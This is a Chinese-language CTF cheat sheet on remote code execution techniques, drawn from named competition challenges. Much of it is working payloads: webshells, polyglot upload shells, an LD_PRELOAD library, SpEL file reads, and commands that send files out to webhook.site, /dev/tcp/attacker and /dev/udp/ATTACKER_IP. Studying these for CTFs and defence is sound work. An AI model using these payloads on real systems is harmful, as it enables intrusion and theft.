# 代码执行与命令执行

注入总入口（SQL/XXE/SSRF/SSTI/命令注入基础）见 [[web/漏洞分类/注入类/服务端注入总入口.md|server-side.md]]；反序列化与竞争见 [[web/漏洞分类/注入类/反序列化与竞争条件.md|server-side-deser.md]]；冷门语言与 CVE 链见 [[web/漏洞分类/注入类/服务端高级技巧.md|server-side-advanced.md]]。

## 0. 判据速查

| 观察到的现象 | 执行原语来自 | 去哪节 |
|---|---|---|
| 源码里有 `eval` / `instance_eval` / `assert` / `create_function` / `preg_replace /e` | 语言级求值 | §1、§2 |
| 有上传功能 | 落盘 + 解析器认扩展名 | §3 |
| 有「服务端执行某个 CLI」的功能（图片处理、git、ping、压缩包） | 参数拼接 | §4 |
| `disable_functions` 全禁了 exec | PHP 层外的执行通道 | §5 |
| 能控制参数但注入不进 shell | 非 shell 的文件读取 | §6 |
| 路由/正则/序列化格式写错 | 解析层绕过 | §7 |
| 数据在响应头/WebSocket/API filter 里 | 藏匿与批量赋值 | §8 |

**核心判据**：RCE 只问一件事 —— **有没有一个环节把字符串当代码/命令解释**。语言求值、shell 拼接、模板渲染、反序列化、上传后的解析器，都是同一件事的不同外衣。

## 1. 语言级求值注入

### 1.1 Ruby `instance_eval`

```ruby
# 模板：apply_METHOD('VALUE')
# 注入 VALUE = valid');PAYLOAD#
# 结果：apply_METHOD('valid');PAYLOAD#')
```

关键词黑名单绕过：

| 被拦 | 替代 |
|---|---|
| `File.read` | `Kernel#open`、类辅助方法 |
| `File.write` | `open('path','w'){|f|f.write(data)}` |
| `system` / `exec` | `open('\|cmd')`、`%x[cmd]`、`Process.spawn` |
| `IO` | `Kernel#open` |

外带：

```ruby
open('public/out.txt','w'){|f|f.write(read_file('/flag.txt'))}
Process.spawn("curl https://webhook.site/xxx -d @/flag.txt").tap{|pid| Process.wait(pid)}
```

### 1.2 Ruby 沙箱里读不到变量 → 扫堆

```ruby
ObjectSpace.each_object(String) { |x| x[0..3] == "TWCT" and print x }
```

其他绕私有可见性：

```ruby
def p.x; flag end; p.x      # 单例方法
p.send(:flag)               # send 无视 private
p.method(:flag).call
```

**判据**：`ObjectSpace.each_object(String)` 遍历堆上所有活字符串，包括存在私有变量里的。按 flag 前缀过滤即可。

（题目例证：Tokyo Westerns 2016）

### 1.3 Perl 两参数 `open()`

```perl
open(my $fh, $user_controlled_path);   # 2 参数形式，文件名里的模式字符会被解释
# "|command_here" 或 "command|"
```

**判据**：任何 Perl CGI 用 2 参数 `open()` 打开用户给的文件名就是 RCE。3 参数形式（显式模式）安全。

### 1.4 JS `eval` 黑名单 → 方括号拼串

```javascript
row['con'+'structor']['con'+'structor']('return this')()
```

`['con'+'structor']` 取到 `Function` 构造器，等于 eval 但没有任何可拦的关键词。同类：模板字符串、`String.fromCharCode`、反转字符串。

### 1.5 PHP 反引号 + 字符限制

`eval()` 有长度限制时，反引号（等价 `shell_exec`）最省字符：

```php
echo`cat *`;      // 12 字符，读所有文件
echo`ls`;         // 9 字符
`$_GET[0]`;       // 11 字符，把真 payload 挪到 URL 参数
```

```text
system('id');     // 13
exec('id');       // 11
echo`cat *`;      // 12
```

`$_GET[0]` 这招直接把限制作废 —— eval 里只留最小骨架，真命令走参数。

### 1.6 PHP `extract()` 覆盖变量

```php
if (!ini_get("register_globals")) extract($_GET);
```

```text
GET /?_BHVAR[db][host]=attacker.com&_BHVAR[db][user]=root&_BHVAR[db][pass]=pass
```

把数据库连接参数指向自己的 MySQL，返回伪造的查询结果（路径、凭证等）。

**判据**：源码里搜 `extract($_GET)` / `extract($_POST)` / `extract($_REQUEST)`。

（题目例证：SecuInside 2013）

### 1.7 Prolog

```text
# 原查询：hanoi(USER_INPUT)
3), exec(ls('/')), write('\n'
3), exec(cat('/flag')), write('\n'
```

Prolog 的 goal 用 `,`（AND）串联。注入 `3), exec(cmd)` 闭合原谓词再接任意 goal。

**识别**：报错里有 "Prolog initialisation failed" 或 "Operator expected"。SWI-Prolog 的 `exec/1`、`shell/1` 执行系统命令；备选 `process_create/3`、`read_file_to_string/3`。

（题目例证：PoliCTF 2015）

### 1.8 Common Lisp reader macro

```lisp
#.(ext:run-program "cat" :arguments '("/flag"))
#.(run-shell-command "cat /flag")
```

`read` 函数在**解析期**就求值 `#.(expr)`。应用用 `read` 处理用户输入（而不是 `read-line`）就是任意代码执行。

**判据**：Lisp 里 `read` 是「数据即代码」的设计。修法：字符串输入一律用 `read-line`。

（题目例证：Insomnihack 2016）

### 1.9 Redis Lua

```lua
-- 漏洞形态（字符串拼接，而非 ARGV）
local script = "return redis.call('GET', '" .. user_key .. "')"
```

```
?n=123') and redis.call('get', 'admin') --
```

生成：

```lua
return redis.call('GET', '123') and redis.call('get', 'admin') -- ')
```

**判据**：`redis.call()` / `redis.pcall()` 是 Lua 内的 Redis 直通桥 —— HTTP 层的命令黑名单在 Lua 注入后完全失效。必须用 `KEYS[]` / `ARGV[]`。

（题目例证：HumanCTF 2018）

### 1.10 Python f-string 布尔短路的盲读

模板在 f-string 里求值用户输入，引号被过滤：

```python
# {FLAG>'c' or 14:x}
# FLAG > 'c' → True/False
# True or 14 → True（渲染 "True"）
# False or 14 → 14，按 :x 格式化成 "e"
payload = "{FLAG>'c' or 14:x}"
```

一次请求读一位比较结果，二分法逐字节还原 `FLAG`，全程不出现引号。

**判据**：f-string 的 `{}` 里是完整 Python 表达式，能用作用域内已有变量、比较运算和 `:x`/`:b`/`:c` 格式转换。只查「有没有引号/有没有 `__class__`」的过滤必然失效。

（题目例证：Meepwn CTF Quals 2018）

## 2. PHP 特有执行面

### 2.1 `preg_replace` 的 `/e`

```php
preg_replace($pattern . "/e", $replacement, $input);   // replacement 被当 PHP 执行
```

配合 `unserialize()` 走 POP 链：

```php
$filter = new OutputFilter("/^./e", 'system("cat /flag")');
$cookie = serialize($filter);      // 作为 cookie 发送
```

`/e` 在 PHP 5.5 弃用、7.0 移除。目标若是 PHP 5.x，正则里看到 `/e` 就是 eval sink。

（题目例证：PlaidCTF 2014）

### 2.2 `assert()` 字符串求值

```php
assert("strpos('$page', '..') === false");
```

```
?page=' and die(show_source('templates/flag.php')) or '
?page=' and die(system('cat /flag')) or '
?page='.die(highlight_file('config.php')).'
```

PHP 7.2 弃用、8.0 移除，但老应用还在。**找法**：暴露的 `.git` 目录读源码。

（题目例证：CSAW CTF 2016）

### 2.3 `create_function` 拼串

```php
create_function('$a, $b', 'return strcmp($a->'.$order.', $b->'.$order.');')
```

```
order=;system($_GET[c]);return 0;//
&c=id
```

**判据**：任何「从字符串生成代码」的 PHP 函数（`eval` / `create_function` / `assert`）都接受分号 + 注释的逃逸。PHP 8 已移除 `create_function`，但 2018 年前后的应用到处都是。

（题目例证：FireShell 2019）

### 2.4 只校验语法形态的 eval 沙箱

沙箱用递归正则 `/[^\W_]+\((?R)?\)/` 只允许「单个函数调用」，挡掉了 `system($_GET[...])` 这类带下划线/多语句的 payload。

**绕过**：`current(getallheaders())` 本身就是一个合法单函数调用，运行时返回第一个 HTTP 头的值 —— 攻击者完全可控。

```bash
curl "http://target/?cmd=eval(current(getallheaders()));" \
     -H "Zzz: system('cat /flag');"
```

- `getallheaders()` 返回请求头的关联数组
- `current()` 取第一个元素（用 `Zzz` 这类靠后的名字或放在最前，确保自己是索引 0）
- 外层 `eval` 消费这个字符串

**判据**：只检查表达式**形态**（函数名 + 括号）的过滤器，必然被「返回值是下一段 payload」的函数击穿。同类源：`get_defined_vars`、`file_get_contents('php://input')`、`current($_SERVER)`。

（题目例证：RCTF 2018 — calc）

### 2.5 `php://input` + NULL 截断 + `~` 位运算

```text
GET: ?name=z.php%00&file=php://input
POST body: <?=`~(chr(0x9c).chr(0x9e).chr(0x8b))`?>
```

`%00` 截断写入的文件名；`~` 把非 base64 字节变成 ASCII 操作码（`cat`），绕过 base64 字母表校验。

（题目例证：DefCamp 2018 — Scribbles）

## 3. 上传到 RCE

### 3.1 控制扩展名解析

**`.htaccess` / `.user.ini`**：

```
1. 上传 .htaccess：AddType application/x-httpd-php .lol
2. 上传 rce.lol：<?php system($_GET['cmd']); ?>
3. 访问 rce.lol?cmd=cat+flag.txt
```

**默认 PHP 处理器认的扩展名全表**：

```
.php  .phtml  .phps  .php3  .php4  .php5  .php7  .phar
```

黑名单只列 `.php` / `.phtml` / `.phps` 时，`.phar` 直接过：

```http
POST /upload HTTP/1.1
filename=shell.phar

[JPEG header] <?php system($_GET["c"]); ?>
```

**判据**：上传黑名单必须覆盖上表全部。`.phar` 是最常被漏的一个。

（题目例证：35C3 CTF 2018 — express-yourself）

### 3.2 polyglot：合法图片 + 合法 PHP

PHP 解释器**忽略 `<?php` 之前的所有内容**，所以任何格式的合法文件都能在后面接 PHP。

**PNG**：

```bash
cp valid_image.png polyglot.png.php
cat >> polyglot.png.php << 'PAYLOAD'
<?php
$files = scandir('/');
foreach ($files as $f) {
    if (strpos($f,'flag') !== false || strpos($f,'ctf') !== false) {
        echo "FOUND: $f\n"; echo file_get_contents("/$f");
    }
}
print_r($files);
?>
PAYLOAD
```

双扩展名候选：

```
.png.php   .jpg.php   .gif.php   .png.phtml   .png.phar   .png.php5   .php.png
```

**BMP 像素编码**（扩展名校验 + 文件名截断同时存在时）：

```python
import struct
payload = "<?php @$_GET[a]($_GET[b]);?>"
def pad(s, block=3):
    while len(s) % block != 0: s += " "
    return s
def chunk(s, n): return [s[i:i+n] for i in range(0, len(s), n)]

with open("template.bmp","rb") as f: data = bytearray(f.read())
pixel_offset = struct.unpack_from('<I', data, 10)[0]      # BMP 头第 10-13 字节是像素偏移

idx = pixel_offset
for c in chunk(pad(payload), 3):
    data[idx+2] = ord(c[0])   # BMP 是 BGR 序
    data[idx+1] = ord(c[1])
    data[idx]   = ord(c[2])
    idx += 4                  # 32 位 BMP 跳过 alpha；24 位用 3

# 截断利用：50 字符上限，".JPG" 过校验后被截掉
name = "A"*46 + ".php"
requests.post("http://target/upload",
              data={"data": str(list(data)), "name": name + ".JPG", "format": "BMP"})
requests.get(f"http://target/uploads/{name}", params={"a":"system","b":"cat /flag.txt"})
```

**截断通式**：上限 N 字符时 `"A"*(N-4) + ".php" + ".ext"`，`.ext` 过校验后被截掉。

**判据**：polyglot 能成的前提是「服务器不重新渲染图片」。若它会 decode 再 encode，像素数据会被抹掉 —— 这时改用 §3.3 的路径写入。

（题目例证：MetaCTF Flash 2026 — Brand Kit；Nuit du Hack CTF 2018）

### 3.3 控制上传路径

**Python `.so` 劫持**：

```bash
gcc -shared -fPIC -o auth.so malicious.c        # 用 __attribute__((constructor))
# 路径穿越上传
{"filename": "../utils/auth.so"}
# 删掉 .pyc 强制重新导入
{"filename": "../utils/__pycache__/auth.cpython-311.pyc"}
```

**ZipSlip**：压缩包里放软链接（读）或 `../` 条目（写）。

**Gogs 软链接 RCE**（CVE-2025-8110）：

1. 建仓库，`ln -s .git/config malicious_link`，push
2. API 更新 `malicious_link` → 覆盖 `.git/config`
3. 注入 `core.sshCommand` 挂反弹 shell

### 3.4 日志投毒

```
1. PHP payload 写进 User-Agent
2. 路径穿越包含：....//....//....//var/log/apache2/access.log
```

### 3.5 借 CLI 的文件名当扩展名

**wget 保留 GET 参数**：

```
URL: http://attacker.com/avatar.png?shell.php
parse_url($url)['path'] = '/avatar.png'      # 过了 .png 校验
wget 存成: avatar.png?shell.php              # 服务器当 PHP 解析
```

访问时 URL 编码 `?`：`http://target/data/hash/avatar.png%3fshell.php?cmd=id`

**判据**：`parse_url()` 把 path 和 query 分开，校验只看 path；`wget` 不带 `-O` 时把 query 拼进文件名。

（题目例证：SECUINSIDE 2016 — trendyweb）

**tar 文件名注入**：

```bash
mkdir exploit && cd exploit
touch 'name; cat /flag #'
tar cf exploit.tar *
# 服务器在 CGI 里执行 echo "name; cat /flag #"
```

（题目例证：CyberSecurityRumble 2016 — Jobs）

**EXIF 元数据注入**：

```bash
exiftool -ImageDescription="Santa ; /bin/bash -c 'cat /opt/flag > /dev/tcp/attacker/8081'" evil.jpg
curl -F upload=@evil.jpg http://target/
```

`ImageDescription`、`Artist`、`Software`、GPS 标签都能用。修法：`escapeshellarg()`。

（题目例证：OTW Advent 2018）

## 4. CLI 参数拼接

### 4.1 未锚定的正则

```php
if (preg_match('/^(\d{1,3}\.){3}\d{1,3}/', $_GET['ip'])) {   // 缺 $ 结尾
    exec("ping -c 1 " . $_GET['ip']);
}
```

```bash
curl "http://target/ping.php?ip=1.1.1.1;cat%20/flag.txt"
```

**判据**：`^pattern` 没有 `$` 只固定前缀。审计时 grep `preg_match('/\^`，逐个确认有没有 `$/` 或 `\z/`。同样的 bug 在 JS `String.match` 和 Python `re.match`（左锚右不锚）里都有。

（题目例证：picoCTF 2018）

### 4.2 空格与元字符全禁时

**bash 花括号展开**（不需要字面空格）：

```bash
{ls,-la,../..}                                    # 展开成 ls -la ../..

# 出网 TCP 被禁时走 UDP
<({ls,-la,../..}>/dev/udp/ATTACKER_IP/53)

# 执行 base64 payload
<({base64,-d,ENCODED_PAYLOAD}>/tmp/s.sh)
```

**判据**：`{a,b,c}` 用逗号分隔展开成空格分隔的 token。配合 `/dev/udp/`、`/dev/tcp/` 做外带，能绕掉「禁空格 + 禁大部分元字符」的过滤。

（题目例证：Insomnihack 2016）

### 4.3 非 shell 的任意文件读

**`date -f`**：把每行当日期格式串处理，非法的行会出现在错误信息里：

```bash
date -f /etc/passwd
# date: invalid date 'root:x:0:0:root:/root:/bin/bash'
```

```bash
curl "http://target/cgi-bin/app.cgi" --data "cmd=date+-f+/flag.txt"
```

（题目例证：Can-CWIC 2017）

**LaTeX `\input{|"cmd"}`**：

```latex
\input{|"id"}
\input{|"cat /flag.txt"}
```

```latex
\documentclass{article}
\begin{document}
{\catcode`_=12 \ttfamily
\input{|"ls /home/user/"}
}
\end{document}
```

`\catcode` 调整是为了让命令输出里的下划线/括号不被当特殊字符。

读文件不走 shell：

```latex
\begingroup\makeatletter\endlinechar=\m@ne\everyeof{\noexpand}
\edef\x{\endgroup\def\noexpand\filecontents{\@@input"/etc/passwd" }}\x
\filecontents
```

**判据**：任何 `.tex` 上传、PDF 预览/编译服务。

（题目例证：Hack.lu CTF 2012）

**XPath 盲注**：

```text
1' and substring(normalize-space(../../../node()),1,1)='a' and '2'='2
```

```python
for pos in range(1, 100):
    for c in string.printable:
        payload = f"1' and substring(normalize-space(../../../node()),{pos},1)='{c}' and '2'='2"
        if len(requests.get(url, params={'sort': payload}).text) > 1050:
            result += c; break
```

`normalize-space()` 去空白，`../../../` 遍历 XML 树。布尔 oracle 用响应长度差。

（题目例证：BaltCTF 2013）

### 4.4 备份文件泄露源码

| 编辑器 | 备份形态 |
|---|---|
| gedit / nano | `file~` |
| vim | `.file.swp`、`.file.swn`、`.file.swo` |
| emacs | `file~`、`#file#` |

## 5. 绕过 `disable_functions`

### 5.1 纯文件函数（最省事）

exec 类全禁时，文件系统函数通常还在：

```php
scandir('/');                     // 列目录
glob('/flag*');                   // 通配匹配
file_exists('/flag.txt');
file_get_contents('/flag.txt');   // 读文件
readfile('/flag.txt');            // 直接输出
file('/flag.txt');                // 按行读成数组
fopen('/flag.txt','r');

phpinfo();                        // 看 disable_functions / open_basedir 实际值
getenv('FLAG');
get_defined_vars();
ini_get('open_basedir');
ini_get('disable_functions');
```

**先枚举再读**：flag 文件名常是随机的，`scandir('/')` 看到真实名字再 `file_get_contents`。

### 5.2 OPcache 二进制 webshell

PHP7 开了 `opcache.file_cache` 时，编译产物落在 `/tmp/OPcache/[system_id]/[webroot]/script.php.bin`。**这个 .bin 只校验 system_id，无完整性校验** —— 替换它即可执行任意 PHP，绕过上传限制。

```bash
# 1. 从 phpinfo() 算 system_id
python3 system_id_scraper.py http://target/phpinfo.php
# → 39b005ad77428c42788140c6839e6201

# 2. 本地生成 opcode 缓存（PHP 版本必须一致）
php -d opcache.enable_cli=1 -d opcache.file_cache=/tmp/OPcache \
    -d opcache.file_cache_only=1 -f payload.php

# 3. 改二进制里第 9-40 字节的 system_id
# 4. 经 SQLi INTO DUMPFILE 写入
```

```sql
-1 UNION SELECT X'<hex_of_payload.php.bin>'
INTO DUMPFILE '/tmp/OPcache/39b005ad77428c42788140c6839e6201/var/www/html/upload/evil.php.bin' #
```

### 5.3 `LD_PRELOAD` 借外部程序

`disable_functions` 只限制 **PHP 层**的调用。`mail()` 会拉起外部 sendmail，那个进程不受 PHP 限制，且尊重 `LD_PRELOAD`。

```c
/* evil.c — gcc -Wall -fPIC -shared -o evil.so evil.c -ldl */
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

void payload(char *cmd) {
    char buf[512];
    snprintf(buf, sizeof(buf), "%s > /tmp/_output.txt", cmd);
    system(buf);
}

int geteuid() {
    if (getenv("LD_PRELOAD") == NULL) return 0;
    unsetenv("LD_PRELOAD");
    char *cmd = getenv("_evilcmd");
    if (cmd) payload(cmd);
    return 1;
}
```

```php
<?php
putenv("LD_PRELOAD=/var/www/html/upload/evil.so");
putenv("_evilcmd=" . $_GET['cmd']);
mail("x@x.x", "", "", "");
show_source("/tmp/_output.txt");
?>
```

**判据**：`putenv` + `mail`（或 `error_log`、`mb_send_mail`）三件套还在就能绕。同类：`imap_open`、`ImageMagick` 调用。

（题目例证：ALICTF 2016 — Homework）

## 6. 解析层绕过

### 6.1 Apache `mod_rewrite` + `PATH_INFO`

```apache
RewriteRule ^index\.php$ index.php [L]          # 放行 index.php
RewriteRule ^getflag$    /forbidden.html [R,L]  # 拦 /getflag
```

规则**从上往下、首个 `[L]` 命中即停**，于是：

```bash
curl http://target/getflag            # 403
curl http://target/index.php/getflag  # 200，PHP 收到 PATH_INFO=/getflag
```

```php
$action = $_SERVER['PATH_INFO'];      // "/getflag"
if ($action === '/getflag') { echo $flag; }
```

**判据**：`/index.php/受保护路径` 让「放行 PHP 文件」的规则先命中。应用自己的路由再从 `PATH_INFO` 分发到受保护处理器。

（题目例证：EKOPARTY 2017）

### 6.2 自定义序列化：1 字节长度溢出 256→0

格式 `<type_byte><length_byte><data>`，长度用 `chr(len)` 存。字段正好 256 字节时 `chr(256)` 回绕成 `\x00`，解析器当长度 0，后面 256 字节被当**下一个字段**读 —— 攻击者借此覆写密码哈希和权限字段。

```python
pw_hash = hashlib.md5(b"hacked").hexdigest()            # 32 字符

injected_mail  = '\x01\x20' + pw_hash                   # type=string, len=32
injected_level = '\x01\x01' + '2'                       # len=1, 值 '2'（admin）

overhead = len(injected_mail) + len(injected_level) + 2  # +2 是 ip 字段头
pad_len  = 256 - overhead
injected_ip = '\x01' + chr(pad_len) + 'A' * pad_len

payload_email = injected_mail + injected_ip + injected_level   # 正好 256
requests.post("http://target/register",
              data={"email": payload_email, "password": "hacked", "username": "attacker"})
```

**通式**：N 字节长度字段在 `2**(8N)` 处回绕。1 字节 → 256，2 字节 → 65536。

**判据**：二进制文件型数据库、自定义 session 格式、私有协议解析器。需要知道字段顺序（可从同功能的正常记录反推）。

（题目例证：Codegate 2018）

### 6.3 ReDoS 跳过后续代码

`preg_match()` 是同步的。灾难性回溯的正则超时后返回 `false`（不是 `0`），**依赖它成功的代码块整个不执行**。

```php
if (preg_match('/^(ADMIN-+)+$/', $role)) {
    // 超时 → false → 不进这里
}
$db->query("INSERT INTO acl (user, role) VALUES (?, ?)", [$user, 'ADMIN']);
// ACL 记录没写 → 等价「无限制」或落到最宽松默认
```

```python
redos_payload = 'ADMIN-' + '-' * 50 + '!'    # 尾部 ! 强制全量回溯
requests.post('http://target/register', data={'username':'victim','role':redos_payload})
```

**判据**：这**不只是 DoS** —— 当缺失的副作用改变安全状态（ACL 记录、限流计数、审核日志）时，它就是权限绕过。

（题目例证：CODE BLUE 2017）

## 7. 藏匿与批量赋值

### 7.1 响应头里藏数据

```bash
curl -sI "https://target/api/endpoint?seed=<seed>"
curl -sv "https://target/api/endpoint" 2>&1 | grep -i "x-"
```

`x-flag`、`x-archive-tag` 这类自定义头在浏览器渲染结果里看不见。**API 端点必须看响应头。**

### 7.2 WebSocket 批量赋值

```json
{"username": "user", "isAdmin": true}
```

handler 不白名单字段就直接映射到对象 → 提权。同 REST 的 mass assignment，只是走 WS。

### 7.3 API filter 参数注入

```bash
# UI 发：filter={"region":"all"}
# 注入：  filter={"region":"all","caseId":"*"}
# 可能多返回：case_detail, notes, proof codes
```

**判据**：后端把 filter 当「查询条件集合」而非「固定字段」时，加字段就多拿数据。

### 7.4 Thymeleaf SpEL + 用框架工具绕 WAF

WAF 拦 `Runtime` / `ProcessBuilder` / `FileInputStream`，但没拦 Spring 自己的工具类：

```bash
# 1. 注册时批量赋值拿 admin
curl -X POST http://target/api/register -H "Content-Type: application/json" \
  -d '{"username":"attacker","password":"pass","email":"a@b.com","role":"ADMIN"}'

# 2. SpEL 列目录（java.io.File 没被拦）
curl -X POST http://target/api/admin/preview -H "Content-Type: application/json" \
  -H "X-Api-Token: <token>" \
  -d '{"template": "${T(java.util.Arrays).toString(new java.io.File(\"/app\").list())}"}'

# 3. 用 FileCopyUtils + 字符串拼接绕 WAF
curl -X POST http://target/api/admin/preview -H "Content-Type: application/json" \
  -H "X-Api-Token: <token>" \
  -d '{"template": "${new java.lang.String(T(org.springframework.util.FileCopyUtils).copyToByteArray(new java.io.File(\"/app/fl\"+\"ag.txt\")))}"}'
```

其他 SpEL 读文件 payload：

```text
${T(org.springframework.util.StreamUtils).copyToString(new java.io.FileInputStream("/flag.txt"), T(java.nio.charset.StandardCharsets).UTF_8)}
${new String(T(java.nio.file.Files).readAllBytes(T(java.nio.file.Paths).get("/flag.txt")))}
```

**关键**：distroless 容器**没有 `/bin/sh`**，`Runtime.exec()` 就算不被拦也没用。`FileCopyUtils.copyToByteArray()` 不拉进程就能读文件。`"fl"+"ag.txt"` 绕静态关键词匹配。

（题目例证：ApoorvCTF 2026 — Sugar Heist）

## 8. 纪律

- **先问「执行原语从哪来」**，再选 payload。语言求值、上传落盘、CLI 拼接是三条完全不同的路，按语言背 payload 是最低效的做法。
- **`disable_functions` 不是终点**。先试纯文件函数（§5.1），再试 OPcache（§5.2）和 LD_PRELOAD（§5.3）。三层里至少一层能过。
- **上传先确认服务器会不会重新渲染**。会重渲染 → polyglot 像素方案失效，改用路径写入或 `.htaccess`。
- **PHP 扩展名黑名单必须全表对照**。`.phar` 是最高频的漏网之鱼。
- **正则校验一律看有没有右锚**。`^pattern` 缺 `$` 是最常见的命令注入入口。
- **ReDoS 当权限绕过打，不只是 DoS**。找「超时后本该执行的副作用」——ACL 写入、计数、日志。
- **报的是「执行了命令 / 读到了 flag」不是「存在注入点」**。成果要落到具体的执行证据。
